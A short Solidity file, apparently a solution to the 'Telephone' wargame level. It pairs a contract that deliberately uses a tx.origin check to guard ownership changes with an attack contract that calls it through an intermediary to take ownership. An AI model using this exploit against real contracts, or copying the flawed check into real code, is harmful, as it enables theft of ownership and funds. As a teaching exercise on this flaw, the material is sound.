// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Contract to attack...

contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    // --> tx.origin
    // --> https://docs.soliditylang.org/en/v0.8.18/units-and-global-variables.html#block-and-transaction-properties
    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {
            owner = _owner;
        }
    }
}

// Attack contract...

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {
    address public immutable instance;

    constructor(address _instance) {
        instance = _instance;
    }

    function attackChangeOwner(address _newOwner) public {
        ITelephone(instance).changeOwner(_newOwner);
    }
}
